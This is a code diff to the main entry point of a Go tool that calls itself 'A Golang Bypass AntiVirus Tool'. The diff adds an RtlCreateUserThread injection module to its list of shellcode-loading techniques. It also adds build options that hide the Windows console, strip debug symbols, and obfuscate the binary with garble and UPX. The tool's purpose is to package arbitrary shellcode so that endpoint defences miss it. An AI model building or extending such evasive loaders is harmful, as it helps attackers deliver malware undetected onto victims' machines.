@@ -24,6 +24,7 @@ const (
 	EtwpCreateEtwThread      = "EtwpCreateEtwThread"
 	HeapAlloc                = "HeapAlloc"
 	NtQueueApcThreadEx       = "NtQueueApcThreadEx"
+	RtlCreateUserThread      = "RtlCreateUserThread"
 )
 
 func main() {
@@ -32,24 +33,30 @@ func main() {
 		module    string
 		shellcode string
 		ldflags   bool
+		race      bool
+		hide      bool
 		upx       bool
 		garble    bool
 		help      bool
 	)
-	flag.StringVar(&shellcode, "s", "shellcode.txt", "")
 	flag.StringVar(&module, "m", "", "")
-	flag.BoolVar(&ldflags, "l", false, "")
+	flag.BoolVar(&ldflags, "d", false, "")
+	flag.BoolVar(&race, "r", false, "")
+	flag.BoolVar(&hide, "w", false, "")
 	flag.BoolVar(&upx, "u", false, "")
 	flag.BoolVar(&garble, "g", false, "")
+	flag.StringVar(&shellcode, "s", "shellcode.txt", "")
 	flag.BoolVar(&help, "h", false, "")
 	flag.Parse()
 	if help {
-		fmt.Println("A Golang Bypass AntiVirus Tool")
+		fmt.Println("A Golang Bypass AntiVirus Tool (coded by 4ra1n)")
 		fmt.Println("\nusage: go run main.go -m [MODULE] -u -g")
 		fmt.Println("\t-m : use module (default: null)")
-		fmt.Println("\t-l : use ldflags (default: false)")
+		fmt.Println("\t-d : delete symbol table and debug info (default: false)")
+		fmt.Println("\t-r : use race detector (default: false)")
+		fmt.Println("\t-w : hide windows gui (default: false)")
 		fmt.Println("\t-u : use upx (default: false)")
-		fmt.Println("\t-g : use garble (default: false)")
+		fmt.Println("\t-g : build by garble (default: false)")
 		fmt.Println("\t-s : shellcode (default: shellcode.txt)")
 		fmt.Println("\nmodules:")
 		fmt.Println("\t", CreateFiber)
@@ -64,6 +71,7 @@ func main() {
 		fmt.Println("\t", EtwpCreateEtwThread)
 		fmt.Println("\t", HeapAlloc)
 		fmt.Println("\t", NtQueueApcThreadEx)
+		fmt.Println("\t", RtlCreateUserThread)
 		return
 	}
 	shellcode = parser.ParseShellCode(shellcode)
@@ -84,23 +92,17 @@ func main() {
 		module != EarlyBird &&
 		module != EtwpCreateEtwThread &&
 		module != HeapAlloc &&
-		module != NtQueueApcThreadEx {
+		module != NtQueueApcThreadEx &&
+		module != RtlCreateUserThread {
 		log.Error("error module")
 		log.Info("see help: go run main.go -h")
 		return
 	}
 	code := parser.GetFinalCode(module, shellcode)
-	if ldflags && !garble {
-		build.AdvanceBuild(code)
-	}
-	if garble && !ldflags {
-		build.NormalGarble(code)
-	}
-	if garble && ldflags {
-		build.AdvanceGarble(code)
-	}
-	if !garble && !ldflags {
-		build.NormalBuild(code)
+	if garble {
+		build.Garble(code, ldflags, hide, race)
+	} else {
+		build.Build(code, ldflags, hide, race)
 	}
 	if upx {
 		tool.StartUpx()
